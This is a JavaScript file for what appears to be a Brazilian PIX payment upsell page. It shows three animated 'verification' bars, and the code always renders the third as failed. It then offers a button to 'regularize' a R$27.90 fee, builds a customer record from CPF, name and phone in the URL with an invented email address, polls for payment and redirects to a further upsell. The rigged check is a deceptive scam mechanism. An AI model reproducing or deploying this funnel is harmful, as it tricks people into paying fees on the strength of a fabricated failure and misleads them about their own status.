function animateBar(barId, imgId) {
  const bar = document.getElementById(barId);
  let startTime = null;

  window.requestAnimationFrame(function step(timestamp) {
    if (!startTime) startTime = timestamp;
    const progress = timestamp - startTime;
    const percentage = Math.min(progress / 900, 1);
    bar.style.background = `linear-gradient(to right, #4CAF50 ${100 * percentage}%, #E5E7EB ${100 * percentage}%)`;

    if (progress < 900) {
      window.requestAnimationFrame(step);
      return;
    }

    bar.style.background = "#4CAF50";
    document.getElementById(imgId).src = imgId === "img3" ? "./images/failed.gif?" + imgId : "./images/success.gif?" + imgId;
  });
}

function showProgressAndCheck(barId, checkId, imgId, textId, delay) {
  setTimeout(() => {
    animateBar(barId, imgId);
    setTimeout(() => {
      if (checkId === "check3") {
        setTimeout(() => {
          document.getElementById("more-information").style.opacity = 1;
          document.getElementById("show-offer").disabled = false;
        }, 1500);
      }
    }, 900);
  }, delay);
}

const API_CREATE = "../checkout/api/create-payment.php";
const API_CHECK = "../checkout/api/check-payment.php";
const SESSION_KEY = "up1CheckoutSessionId";
const POLL_INTERVAL_MS = 5000;
const POLL_MAX_MS = 10 * 60 * 1000;
const DEFAULT_NEXT_URL = "../up2/index.html";
const UP1_AMOUNT_CENTS = 2790;

const params = new URLSearchParams(window.location.search);
const nome = (params.get("nome") || "Cliente").trim();
const cpf = (params.get("cpf") || "").replace(/\D/g, "");
const pixKey = (params.get("chave_pix") || params.get("cpf") || cpf).trim();
const nextUrl = (params.get("next_up1") || params.get("next") || DEFAULT_NEXT_URL).trim();
const leadPhone = (params.get("phone") || params.get("telefone") || "").replace(/\D/g, "");

let sessionId = localStorage.getItem(SESSION_KEY) || "";
let pollTimer = null;
let pollStartedAt = 0;
let expiresAtRaw = null;

function buildCustomerContact() {
  const normalizedCPF = cpf || "cliente";
  const email = `${normalizedCPF}@email.com`.replace(/[^\w@.\-]/g, "");
  const phone = leadPhone.length >= 10 ? leadPhone : "11999999999";
  return { email, phone };
}

function switchModalStep(stepNumber) {
  ["step1", "step2", "step3", "step4"].forEach((id) => {
    const el = document.getElementById(id);
    if (!el) return;
    el.style.display = id === `step${stepNumber}` ? "flex" : "none";
    if (id === "step1") {
      el.style.opacity = id === `step${stepNumber}` ? "1" : "0";
    }
  });
}

function showPixStatus(text, type = "info") {
  const el = document.getElementById("pix-status");
  el.classList.remove("hidden", "ok", "error");
  if (type === "ok") el.classList.add("ok");
  if (type === "error") el.classList.add("error");
  el.textContent = text;
}

function hidePixStatus() {
  const el = document.getElementById("pix-status");
  el.classList.add("hidden");
}

function renderQR(pixCode) {
  const qrEl = document.getElementById("qrcode");
  qrEl.innerHTML = "";
  new QRCode(qrEl, {
    text: pixCode,
    width: 220,
    height: 220,
    correctLevel: QRCode.CorrectLevel.M
  });
}

async function createPixPayment() {
  const regularizeBtn = document.getElementById("regularize-fee-btn");
  regularizeBtn.style.pointerEvents = "none";
  regularizeBtn.style.opacity = "0.65";

  try {
    const { email, phone } = buildCustomerContact();
    var storedUtms = typeof getStoredUtms === "function" ? getStoredUtms() : {};
    var fbpVal = typeof getFbp === "function" ? getFbp() : null;
    if (fbpVal) storedUtms.fbp = fbpVal;

    const payload = {
      session_id: sessionId || undefined,
      name: nome,
      document: cpf,
      phone,
      email,
      amount_cents: UP1_AMOUNT_CENTS,
      pix_key: pixKey,
      flow: "up1",
      tracking_parameters: storedUtms,
      source_url: window.location.href
    };

    const res = await fetch(API_CREATE, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });
    const data = await res.json();

    if (!res.ok || !data.ok) {
      throw new Error(data.error || "Falha ao gerar PIX.");
    }

    sessionId = data.session_id;
    localStorage.setItem(SESSION_KEY, sessionId);
    expiresAtRaw = data.expires_at || null;

    if (typeof fbTrack === "function") {
      fbTrack("InitiateCheckout", {
        currency: "BRL",
        value: UP1_AMOUNT_CENTS / 100,
        content_name: "PIX up1",
        content_ids: [data.payment_code]
      }, { browserOnly: true });
    }

    renderQR(data.pix_qrcode_text);
    document.getElementById("pix-copy-code").textContent = data.pix_qrcode_text;
    switchModalStep(3);
    showPixStatus("PIX gerado com sucesso. Realize o pagamento para continuar.", "ok");
    startPolling();
  } catch (err) {
    switchModalStep(2);
    alert(err.message || "Erro ao gerar pagamento.");
  } finally {
    regularizeBtn.style.pointerEvents = "auto";
    regularizeBtn.style.opacity = "1";
  }
}

async function checkPayment() {
  if (!sessionId) return null;

  const res = await fetch(`${API_CHECK}?session_id=${encodeURIComponent(sessionId)}`, {
    method: "GET",
    headers: { "Accept": "application/json" }
  });
  const data = await res.json();
  if (!res.ok || !data.ok) throw new Error(data.error || "Falha ao consultar status");
  return data;
}

async function verifyNow() {
  try {
    showPixStatus("Verificando pagamento...", "info");
    const status = await checkPayment();
    if (status && status.status === "paid") {
      onPaid();
      return;
    }
    showPixStatus("Pagamento ainda pendente. Assim que confirmar, avancaremos automaticamente.", "info");
  } catch (err) {
    showPixStatus(err.message || "Erro ao verificar pagamento.", "error");
  }
}

function onPaid() {
  stopPolling();
  switchModalStep(4);
  if (typeof fbTrack === "function") {
    fbTrack("Purchase", {
      currency: "BRL",
      value: UP1_AMOUNT_CENTS / 100,
      content_name: "PIX up1"
    });
  }
  window.location.href = nextUrl + window.location.search;
}

function startPolling() {
  stopPolling();
  pollStartedAt = Date.now();

  pollTimer = setInterval(async () => {
    const elapsed = Date.now() - pollStartedAt;
    if (elapsed > POLL_MAX_MS) {
      stopPolling();
      showPixStatus("Tempo de verificacao encerrado. Clique em 'Ja paguei - Verificar'.", "error");
      return;
    }
    try {
      const status = await checkPayment();
      if (status && status.status === "paid") onPaid();
    } catch (err) {}
  }, POLL_INTERVAL_MS);
}

function stopPolling() {
  if (pollTimer) {
    clearInterval(pollTimer);
    pollTimer = null;
  }
}

function updateExpireLabel() {
  const label = document.getElementById("expires-label");
  if (!label) return;
  if (!expiresAtRaw) {
    label.textContent = "--:--";
    return;
  }

  const normalized = expiresAtRaw.replace(" ", "T");
  const expiresDate = new Date(normalized);
  if (Number.isNaN(expiresDate.getTime())) {
    label.textContent = "--:--";
    return;
  }

  const diff = Math.max(0, expiresDate.getTime() - Date.now());
  const min = String(Math.floor(diff / 60000)).padStart(2, "0");
  const sec = String(Math.floor((diff % 60000) / 1000)).padStart(2, "0");
  label.textContent = `${min}:${sec}`;
}

document.addEventListener("DOMContentLoaded", function () {
  showProgressAndCheck("bar1", "check1", "img1", "text1", 0);
  showProgressAndCheck("bar2", "check2", "img2", "text2", 2000);
  showProgressAndCheck("bar3", "check3", "img3", "text3", 4000);

  const modal = document.getElementById("offer-modal");
  const showOfferBtn = document.getElementById("show-offer");
  const regularizeBtn = document.getElementById("regularize-fee-btn");
  const copyPixBtn = document.getElementById("copy-pix-btn");
  const verifyPixBtn = document.getElementById("verify-pix-btn");
  const continueBtn = document.getElementById("continue-after-paid");

  showOfferBtn.addEventListener("click", () => {
    modal.style.display = "flex";
    switchModalStep(1);

    setTimeout(() => {
      const trace = document.getElementById("trace");
      if (!trace) return;
      trace.style.width = "100%";
      setTimeout(() => {
        switchModalStep(2);
      }, 2200);
    }, 600);
  });

  regularizeBtn.addEventListener("click", (event) => {
    event.preventDefault();
    createPixPayment();
  });

  copyPixBtn.addEventListener("click", async () => {
    const code = document.getElementById("pix-copy-code").textContent || "";
    if (!code || code.startsWith("Gerando")) return;
    await navigator.clipboard.writeText(code);
    showPixStatus("Codigo PIX copiado.", "ok");
  });

  verifyPixBtn.addEventListener("click", verifyNow);
  continueBtn.addEventListener("click", () => {
    window.location.href = nextUrl + window.location.search;
  });

  window.addEventListener("click", (event) => {
    if (event.target === modal) {
      modal.style.display = "none";
      stopPolling();
    }
  });

  if (sessionId) {
    modal.style.display = "flex";
    switchModalStep(3);
    showPixStatus("Retomamos sua sessao PIX. Verificando pagamento...", "info");
    startPolling();
  }

  setInterval(updateExpireLabel, 1000);
  updateExpireLabel();
});
